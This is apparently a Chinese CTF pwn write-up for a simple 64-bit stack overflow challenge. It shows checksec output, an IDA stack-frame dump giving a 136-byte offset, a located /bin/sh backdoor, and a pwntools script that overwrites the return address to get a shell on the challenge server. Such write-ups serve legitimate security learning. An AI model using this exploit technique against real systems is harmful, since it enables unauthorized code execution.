# 题目

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744115575793-94c60302-d906-449e-a5f9-89acba7e78fe.png)

# 做法

开虚拟机，checksec

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744116067351-0a54432d-33d6-4949-82d0-a8e030d34455.png)

64位，没开栈保护

扔进IDA（64位），找到main，F5反编译

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744116100993-172f7b06-49e3-4e13-90d4-6f932e0a3365.png)

没啥，点进vulnerable_function

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744116274753-8d9e9352-12ef-49c0-ab66-533e9246bd60.png)

还是没啥，我们点进缓冲区（buf）看下

完整代码如下

```
-0000000000000080 ; D/A/*   : change type (data/ascii/array)
-0000000000000080 ; N       : rename
-0000000000000080 ; U       : undefine
-0000000000000080 ; Use data definition commands to create local variables and function arguments.
-0000000000000080 ; Two special fields " r" and " s" represent return address and saved registers.
-0000000000000080 ; Frame size: 80; Saved regs: 8; Purge: 0
-0000000000000080 ;
-0000000000000080
-0000000000000080 buf             db ?
-000000000000007F                 db ? ; undefined
-000000000000007E                 db ? ; undefined
-000000000000007D                 db ? ; undefined
-000000000000007C                 db ? ; undefined
-000000000000007B                 db ? ; undefined
-000000000000007A                 db ? ; undefined
-0000000000000079                 db ? ; undefined
-0000000000000078                 db ? ; undefined
-0000000000000077                 db ? ; undefined
-0000000000000076                 db ? ; undefined
-0000000000000075                 db ? ; undefined
-0000000000000074                 db ? ; undefined
-0000000000000073                 db ? ; undefined
-0000000000000072                 db ? ; undefined
-0000000000000071                 db ? ; undefined
-0000000000000070                 db ? ; undefined
-000000000000006F                 db ? ; undefined
-000000000000006E                 db ? ; undefined
-000000000000006D                 db ? ; undefined
-000000000000006C                 db ? ; undefined
-000000000000006B                 db ? ; undefined
-000000000000006A                 db ? ; undefined
-0000000000000069                 db ? ; undefined
-0000000000000068                 db ? ; undefined
-0000000000000067                 db ? ; undefined
-0000000000000066                 db ? ; undefined
-0000000000000065                 db ? ; undefined
-0000000000000064                 db ? ; undefined
-0000000000000063                 db ? ; undefined
-0000000000000062                 db ? ; undefined
-0000000000000061                 db ? ; undefined
-0000000000000060                 db ? ; undefined
-000000000000005F                 db ? ; undefined
-000000000000005E                 db ? ; undefined
-000000000000005D                 db ? ; undefined
-000000000000005C                 db ? ; undefined
-000000000000005B                 db ? ; undefined
-000000000000005A                 db ? ; undefined
-0000000000000059                 db ? ; undefined
-0000000000000058                 db ? ; undefined
-0000000000000057                 db ? ; undefined
-0000000000000056                 db ? ; undefined
-0000000000000055                 db ? ; undefined
-0000000000000054                 db ? ; undefined
-0000000000000053                 db ? ; undefined
-0000000000000052                 db ? ; undefined
-0000000000000051                 db ? ; undefined
-0000000000000050                 db ? ; undefined
-000000000000004F                 db ? ; undefined
-000000000000004E                 db ? ; undefined
-000000000000004D                 db ? ; undefined
-000000000000004C                 db ? ; undefined
-000000000000004B                 db ? ; undefined
-000000000000004A                 db ? ; undefined
-0000000000000049                 db ? ; undefined
-0000000000000048                 db ? ; undefined
-0000000000000047                 db ? ; undefined
-0000000000000046                 db ? ; undefined
-0000000000000045                 db ? ; undefined
-0000000000000044                 db ? ; undefined
-0000000000000043                 db ? ; undefined
-0000000000000042                 db ? ; undefined
-0000000000000041                 db ? ; undefined
-0000000000000040                 db ? ; undefined
-000000000000003F                 db ? ; undefined
-000000000000003E                 db ? ; undefined
-000000000000003D                 db ? ; undefined
-000000000000003C                 db ? ; undefined
-000000000000003B                 db ? ; undefined
-000000000000003A                 db ? ; undefined
-0000000000000039                 db ? ; undefined
-0000000000000038                 db ? ; undefined
-0000000000000037                 db ? ; undefined
-0000000000000036                 db ? ; undefined
-0000000000000035                 db ? ; undefined
-0000000000000034                 db ? ; undefined
-0000000000000033                 db ? ; undefined
-0000000000000032                 db ? ; undefined
-0000000000000031                 db ? ; undefined
-0000000000000030                 db ? ; undefined
-000000000000002F                 db ? ; undefined
-000000000000002E                 db ? ; undefined
-000000000000002D                 db ? ; undefined
-000000000000002C                 db ? ; undefined
-000000000000002B                 db ? ; undefined
-000000000000002A                 db ? ; undefined
-0000000000000029                 db ? ; undefined
-0000000000000028                 db ? ; undefined
-0000000000000027                 db ? ; undefined
-0000000000000026                 db ? ; undefined
-0000000000000025                 db ? ; undefined
-0000000000000024                 db ? ; undefined
-0000000000000023                 db ? ; undefined
-0000000000000022                 db ? ; undefined
-0000000000000021                 db ? ; undefined
-0000000000000020                 db ? ; undefined
-000000000000001F                 db ? ; undefined
-000000000000001E                 db ? ; undefined
-000000000000001D                 db ? ; undefined
-000000000000001C                 db ? ; undefined
-000000000000001B                 db ? ; undefined
-000000000000001A                 db ? ; undefined
-0000000000000019                 db ? ; undefined
-0000000000000018                 db ? ; undefined
-0000000000000017                 db ? ; undefined
-0000000000000016                 db ? ; undefined
-0000000000000015                 db ? ; undefined
-0000000000000014                 db ? ; undefined
-0000000000000013                 db ? ; undefined
-0000000000000012                 db ? ; undefined
-0000000000000011                 db ? ; undefined
-0000000000000010                 db ? ; undefined
-000000000000000F                 db ? ; undefined
-000000000000000E                 db ? ; undefined
-000000000000000D                 db ? ; undefined
-000000000000000C                 db ? ; undefined
-000000000000000B                 db ? ; undefined
-000000000000000A                 db ? ; undefined
-0000000000000009                 db ? ; undefined
-0000000000000008                 db ? ; undefined
-0000000000000007                 db ? ; undefined
-0000000000000006                 db ? ; undefined
-0000000000000005                 db ? ; undefined
-0000000000000004                 db ? ; undefined
-0000000000000003                 db ? ; undefined
-0000000000000002                 db ? ; undefined
-0000000000000001                 db ? ; undefined
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

貌似可以构成栈溢出？提前数一下，从buf到r共有8* 16+8=136

Shift+F12打开string窗口，一键找出所有的字符串，找找它的后门函数

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744116449717-fa56689a-b139-4ca4-b56c-00a43ed44ec9.png)

诶，有/bin/sh，点进去，Ctrl+x，确定

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744116510954-063e7010-748b-4c76-af13-f114fdf9fc11.png)

后门函数找到

直接构造exp

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744117075520-3772671e-9a30-46cf-b102-9cc32d5cffac.png)

代码如下

```
#导入pwntools模块：
from pwn import *

#和靶机进行连接：
r = remote("node5.buuoj.cn",27269)

#定义 payload
payload = b'a' * 136 + p64(0x400596)

#发送payload
r.sendline(payload)

#获取靶机交互式终端：
r.interactive()
```

常规，直接得出flag

（注：这里有flag和flag.txt，俩都可以得出flag）

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744117023466-252bc0cf-ca41-4c45-81ea-fe5b07fba7b1.png)

# 更新

于2025.4.8